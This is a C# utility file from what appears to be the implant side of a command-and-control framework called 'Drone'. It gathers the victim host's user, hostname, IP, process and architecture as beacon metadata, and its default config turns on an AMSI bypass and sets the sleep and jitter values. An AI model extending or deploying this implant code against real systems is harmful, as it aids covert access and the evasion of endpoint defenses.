using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;

using Drone.Models;
using Drone.Modules;

namespace Drone
{
    public static class Utilities
    {
        public static bool IsProcess64Bit => IntPtr.Size == 8;

        public static Metadata GenerateMetadata()
        {
            var hostname = Dns.GetHostName();
            var addresses = Dns.GetHostAddresses(hostname);
            var process = Process.GetCurrentProcess();

            return new Metadata
            {
                Guid = Guid.NewGuid().ToShortGuid(),
                Username = Environment.UserName,
                Hostname = hostname,
                Address = addresses.LastOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork)?.ToString(),
                Process = process.ProcessName,
                Pid = process.Id,
                Arch = IsProcess64Bit ? "x64" : "x86"
            };
        }

        public static DroneConfig GenerateDefaultConfig()
        {
            var config = new DroneConfig();
            
            config.SetConfig("SleepInterval", 1);
            config.SetConfig("SleepJitter", 0);
            config.SetConfig("BypassAmsi", true);

            return config;
        }

        public static DroneModuleDefinition MapDroneModuleDefinition(DroneModule module)
        {
            var definition = new DroneModuleDefinition
            {
                Name = module.Name
            };

            foreach (var command in module.Commands)
            {
                if (!command.Visible) continue;
                
                var commandDef = new DroneModuleDefinition.CommandDefinition
                {
                    Name = command.Name,
                    Description = command.Description
                };

                foreach (var argument in command.Arguments)
                {
                    var argumentDef = new DroneModuleDefinition.CommandDefinition.ArgumentDefinition
                    {
                        Label = argument.Label,
                        Artefact = argument.Artefact,
                        Optional = argument.Optional
                    };
                    
                    commandDef.Arguments.Add(argumentDef);
                }
                
                definition.Commands.Add(commandDef);
            }

            return definition;
        }
    }
}